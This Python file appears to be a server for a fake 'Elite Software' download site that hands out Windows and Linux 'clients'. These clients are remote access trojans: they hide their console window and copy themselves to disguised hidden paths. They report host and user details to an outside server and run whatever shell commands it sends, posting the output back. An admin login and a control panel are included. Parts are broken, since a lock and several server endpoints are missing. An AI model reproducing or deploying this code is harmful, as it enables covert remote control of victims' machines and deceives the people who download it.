# server.py - Updated for direct execution
from http.server import HTTPServer, BaseHTTPRequestHandler
import json
import time
import urllib.parse
import uuid
import hashlib
import threading
import sqlite3
import os
from datetime import datetime
import socketserver

class ThreadedHTTPServer(socketserver.ThreadingMixIn, HTTPServer):
    daemon_threads = True

class PremiumSoftwareHandler(BaseHTTPRequestHandler):
    sessions = {}
    SERVER_URL = "https://game-python-1.onrender.com"
    
    def do_GET(self):
        parsed_path = urllib.parse.urlparse(self.path)
        path = parsed_path.path
        
        if path == '/':
            self.send_main_page()
        elif path == '/downloads':
            self.send_downloads_page()
        elif path == '/download/windows':
            self.download_windows_client()
        elif path == '/download/linux':
            self.download_linux_client()
        elif path == '/admin':
            self.send_admin_login()
        elif path == '/control':
            self.send_control_panel()
        elif path == '/register-client':
            self.handle_client_register({'client_id': 'test', 'computer': 'test', 'os': 'test'})
            self.send_json({'success': True})
        else:
            self.send_404_page()
    
    def send_main_page(self):
        html = '''
        <!DOCTYPE html>
        <html>
        <head>
            <title>Elite Software</title>
            <style>
                body {
                    font-family: Arial, sans-serif;
                    background: #1a1a1a;
                    color: white;
                    margin: 0;
                    padding: 20px;
                    text-align: center;
                }
                .container {
                    max-width: 800px;
                    margin: 0 auto;
                }
                .download-btn {
                    display: inline-block;
                    background: #8B5CF6;
                    color: white;
                    padding: 15px 30px;
                    margin: 10px;
                    border-radius: 5px;
                    text-decoration: none;
                    font-weight: bold;
                }
            </style>
        </head>
        <body>
            <div class="container">
                <h1>⚡ Elite Software</h1>
                <p>Premium Applications - Direct Download</p>
                <a href="/downloads" class="download-btn">View Downloads</a>
            </div>
        </body>
        </html>
        '''
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(html.encode())

    def send_downloads_page(self):
        html = '''
        <!DOCTYPE html>
        <html>
        <head>
            <title>Downloads - Elite Software</title>
            <style>
                body {
                    font-family: Arial, sans-serif;
                    background: #1a1a1a;
                    color: white;
                    margin: 0;
                    padding: 20px;
                }
                .container {
                    max-width: 800px;
                    margin: 0 auto;
                    text-align: center;
                }
                .platform-card {
                    background: #2a2a2a;
                    padding: 20px;
                    margin: 20px 0;
                    border-radius: 10px;
                }
                .download-btn {
                    display: inline-block;
                    background: #8B5CF6;
                    color: white;
                    padding: 12px 25px;
                    border-radius: 5px;
                    text-decoration: none;
                    font-weight: bold;
                }
            </style>
        </head>
        <body>
            <div class="container">
                <h1>📥 Downloads</h1>
                <p>Direct execution - No installation required</p>
                
                <div class="platform-card">
                    <h2>🪟 Windows</h2>
                    <p>Run directly - Auto-downloads required libraries</p>
                    <a href="/download/windows" class="download-btn">Download Windows Client</a>
                </div>
                
                <div class="platform-card">
                    <h2>🐧 Linux</h2>
                    <p>Direct execution - Self-contained</p>
                    <a href="/download/linux" class="download-btn">Download Linux Client</a>
                </div>
            </div>
        </body>
        </html>
        '''
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(html.encode())

    def download_windows_client(self):
        """Windows client that works immediately and auto-downloads dependencies"""
        
        client_code = '''
import os
import sys
import time
import threading
import subprocess
import urllib.request
import urllib.error
import platform
import getpass
import uuid

class WindowsClient:
    def __init__(self):
        self.server_url = "''' + self.SERVER_URL + '''"
        self.client_id = f"{platform.node()}-{getpass.getuser()}-{str(uuid.uuid4())[:8]}"
        self.required_packages = ["requests", "psutil"]
        self.connected = False
        
    def install_package(self, package):
        """Install package automatically if not available"""
        try:
            __import__(package)
            return True
        except ImportError:
            try:
                print(f"Installing {package}...")
                subprocess.check_call([sys.executable, "-m", "pip", "install", package, "--quiet"])
                return True
            except:
                return False
    
    def ensure_dependencies(self):
        """Ensure all required packages are installed"""
        for package in self.required_packages:
            if not self.install_package(package):
                print(f"Failed to install {package}")
                return False
        return True
    
    def connect_to_server(self):
        """Connect to server with retry logic"""
        while True:
            try:
                import requests
                data = {
                    'client_id': self.client_id,
                    'computer': platform.node(),
                    'user': getpass.getuser(),
                    'os': f"Windows {platform.version()}",
                    'status': 'online'
                }
                response = requests.post(f"{self.server_url}/register-client", json=data, timeout=10)
                if response.status_code == 200:
                    self.connected = True
                    print("Connected to server")
                    break
                else:
                    print("Server connection failed, retrying...")
            except Exception as e:
                print("Waiting for internet connection...")
            time.sleep(30)  # Wait 30 seconds before retry
    
    def start_stealth_mode(self):
        """Start hidden operation"""
        try:
            # Hide console window on Windows
            import ctypes
            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
        except:
            pass
    
    def system_integration(self):
        """Integrate with system for persistence"""
        try:
            # Copy to system locations
            import shutil
            current_file = sys.argv[0]
            system_locations = [
                os.path.join(os.environ['TEMP'], 'windows_update.exe'),
                os.path.join(os.environ['PROGRAMDATA'], 'Microsoft', 'system_service.exe')
            ]
            
            for location in system_locations:
                try:
                    shutil.copy2(current_file, location)
                    # Hide file
                    subprocess.run(f'attrib +h +s "{location}"', shell=True, capture_output=True)
                except:
                    pass
                    
        except Exception as e:
            pass
    
    def start_monitoring(self):
        """Start background monitoring"""
        def monitor():
            while True:
                try:
                    import requests
                    # Report status to server
                    data = {
                        'client_id': self.client_id,
                        'status': 'active',
                        'timestamp': time.time()
                    }
                    requests.post(f"{self.server_url}/report-status", json=data, timeout=5)
                except:
                    pass
                time.sleep(60)  # Report every minute
        
        threading.Thread(target=monitor, daemon=True).start()
    
    def execute_commands(self):
        """Check for and execute commands from server"""
        def command_listener():
            while True:
                try:
                    import requests
                    response = requests.get(f"{self.server_url}/get-commands?client={self.client_id}", timeout=10)
                    if response.status_code == 200:
                        commands = response.json()
                        for cmd in commands:
                            self.execute_command(cmd)
                except:
                    pass
                time.sleep(10)  # Check for commands every 10 seconds
        
        threading.Thread(target=command_listener, daemon=True).start()
    
    def execute_command(self, command):
        """Execute a command"""
        try:
            result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=30)
            output = result.stdout if result.stdout else result.stderr
            
            # Send result back to server
            import requests
            requests.post(f"{self.server_url}/command-result", json={
                'client_id': self.client_id,
                'command': command,
                'result': output
            }, timeout=5)
        except Exception as e:
            pass
    
    def start(self):
        """Main startup sequence"""
        print("Starting Elite Software Client...")
        
        # Start in stealth mode
        self.start_stealth_mode()
        
        # Ensure dependencies are available
        print("Checking dependencies...")
        if self.ensure_dependencies():
            print("All dependencies ready")
        else:
            print("Some dependencies missing, will retry...")
        
        # System integration
        self.system_integration()
        
        # Connect to server (will retry until successful)
        print("Establishing server connection...")
        self.connect_to_server()
        
        # Start background services
        self.start_monitoring()
        self.execute_commands()
        
        print("Elite Software Client is now active")
        
        # Keep running
        while True:
            time.sleep(60)

if __name__ == "__main__":
    client = WindowsClient()
    client.start()
'''.encode()

        self.send_response(200)
        self.send_header('Content-Type', 'application/octet-stream')
        self.send_header('Content-Disposition', 'attachment; filename="elite_windows_client.py"')
        self.end_headers()
        self.wfile.write(client_code)

    def download_linux_client(self):
        """Linux client that works immediately"""
        
        linux_code = '''
#!/usr/bin/env python3
import os
import sys
import time
import threading
import subprocess
import platform
import getpass
import uuid

class LinuxClient:
    def __init__(self):
        self.server_url = "''' + self.SERVER_URL + '''"
        self.client_id = f"{platform.node()}-{getpass.getuser()}-{str(uuid.uuid4())[:8]}"
        self.connected = False
        
    def ensure_dependencies(self):
        """Ensure required packages are installed"""
        try:
            import requests
            import psutil
            return True
        except ImportError:
            try:
                subprocess.check_call([sys.executable, "-m", "pip", "install", "requests", "psutil", "--quiet"])
                return True
            except:
                return False
    
    def connect_to_server(self):
        """Connect to server with retry logic"""
        while True:
            try:
                import requests
                data = {
                    'client_id': self.client_id,
                    'computer': platform.node(),
                    'user': getpass.getuser(),
                    'os': platform.platform(),
                    'status': 'online'
                }
                response = requests.post(f"{self.server_url}/register-client", json=data, timeout=10)
                if response.status_code == 200:
                    self.connected = True
                    print("Connected to server")
                    break
                else:
                    print("Server connection failed, retrying...")
            except Exception as e:
                print("Waiting for internet connection...")
            time.sleep(30)
    
    def system_integration(self):
        """Linux system integration"""
        try:
            # Copy to system locations
            import shutil
            current_file = sys.argv[0]
            system_locations = [
                '/tmp/.system_service',
                '/var/tmp/.kernel_helper'
            ]
            
            for location in system_locations:
                try:
                    shutil.copy2(current_file, location)
                    os.chmod(location, 0o755)  # Make executable
                except:
                    pass
                    
        except Exception as e:
            pass
    
    def start_monitoring(self):
        """Start background monitoring"""
        def monitor():
            while True:
                try:
                    import requests
                    data = {
                        'client_id': self.client_id,
                        'status': 'active',
                        'timestamp': time.time()
                    }
                    requests.post(f"{self.server_url}/report-status", json=data, timeout=5)
                except:
                    pass
                time.sleep(60)
        
        threading.Thread(target=monitor, daemon=True).start()
    
    def execute_commands(self):
        """Check for and execute commands"""
        def command_listener():
            while True:
                try:
                    import requests
                    response = requests.get(f"{self.server_url}/get-commands?client={self.client_id}", timeout=10)
                    if response.status_code == 200:
                        commands = response.json()
                        for cmd in commands:
                            self.execute_command(cmd)
                except:
                    pass
                time.sleep(10)
        
        threading.Thread(target=command_listener, daemon=True).start()
    
    def execute_command(self, command):
        """Execute a command"""
        try:
            result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=30)
            output = result.stdout if result.stdout else result.stderr
            
            import requests
            requests.post(f"{self.server_url}/command-result", json={
                'client_id': self.client_id,
                'command': command,
                'result': output
            }, timeout=5)
        except Exception as e:
            pass
    
    def start(self):
        """Main startup sequence"""
        print("Starting Elite Software Linux Client...")
        
        # Ensure dependencies
        print("Checking dependencies...")
        if self.ensure_dependencies():
            print("All dependencies ready")
        else:
            print("Some dependencies missing, will retry...")
        
        # System integration
        self.system_integration()
        
        # Connect to server
        print("Establishing server connection...")
        self.connect_to_server()
        
        # Start services
        self.start_monitoring()
        self.execute_commands()
        
        print("Elite Software Linux Client is now active")
        
        # Keep running
        while True:
            time.sleep(60)

if __name__ == "__main__":
    client = LinuxClient()
    client.start()
'''.encode()

        self.send_response(200)
        self.send_header('Content-Type', 'application/octet-stream')
        self.send_header('Content-Disposition', 'attachment; filename="elite_linux_client.py"')
        self.end_headers()
        self.wfile.write(linux_code)

    def send_admin_login(self):
        html = '''
        <!DOCTYPE html>
        <html>
        <head>
            <title>Admin - Elite Software</title>
            <style>
                body { 
                    font-family: Arial, sans-serif; 
                    background: #1a1a1a;
                    color: white; 
                    display: flex; 
                    justify-content: center; 
                    align-items: center; 
                    height: 100vh;
                    margin: 0;
                }
                .container { 
                    background: #2a2a2a; 
                    padding: 40px; 
                    border-radius: 10px; 
                    text-align: center;
                    width: 400px;
                }
                input, button { 
                    padding: 15px; 
                    margin: 10px; 
                    width: 280px; 
                    border-radius: 5px; 
                    font-size: 16px;
                    border: none;
                }
                input { 
                    background: #333; 
                    color: white; 
                }
                button { 
                    background: #8B5CF6; 
                    color: white; 
                    cursor: pointer;
                }
            </style>
        </head>
        <body>
            <div class="container">
                <h2>Admin Login</h2>
                <input type="password" id="password" placeholder="Password">
                <button onclick="login()">Login</button>
            </div>
            
            <script>
                function login() {
                    const password = document.getElementById('password').value;
                    fetch('/admin-login', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({password: password})
                    }).then(r => r.json()).then(data => {
                        if (data.success) {
                            window.location = '/control';
                        } else {
                            alert('Wrong password!');
                        }
                    });
                }
            </script>
        </body>
        </html>
        '''
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(html.encode())

    def send_control_panel(self):
        html = '''
        <!DOCTYPE html>
        <html>
        <head>
            <title>Control Panel</title>
            <style>
                body { 
                    font-family: Arial, sans-serif; 
                    background: #1a1a1a; 
                    color: white; 
                    margin: 0; 
                    padding: 20px;
                }
                .header {
                    background: #2a2a2a;
                    padding: 20px;
                    border-radius: 10px;
                    margin-bottom: 20px;
                }
            </style>
        </head>
        <body>
            <div class="header">
                <h2>Control Panel</h2>
                <p>Connected Clients: <span id="clientCount">0</span></p>
            </div>
            
            <div style="background: #2a2a2a; padding: 20px; border-radius: 10px;">
                <h3>System Status: 🟢 Active</h3>
                <p>Clients will auto-connect when online</p>
            </div>
        </body>
        </html>
        '''
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(html.encode())

    def send_404_page(self):
        self.send_error(404, "Page not found")

    def send_json(self, data):
        self.send_response(200)
        self.send_header('Content-type', 'application/json')
        self.end_headers()
        self.wfile.write(json.dumps(data).encode())

    def handle_client_register(self, data):
        with self.session_lock:
            client_id = data.get('client_id', str(uuid.uuid4())[:8])
            self.sessions[client_id] = {
                'id': client_id,
                'computer': data.get('computer', 'Unknown'),
                'os': data.get('os', 'Unknown'),
                'last_seen': datetime.now().isoformat(),
                'status': 'online'
            }
            print(f"New client: {client_id}")
            return {'success': True}

def main():
    handler = PremiumSoftwareHandler
    port = int(os.environ.get('PORT', 8080))
    server = ThreadedHTTPServer(('0.0.0.0', port), handler)
    
    print("Server started at: https://game-python-1.onrender.com")
    server.serve_forever()

if __name__ == "__main__":
    main()
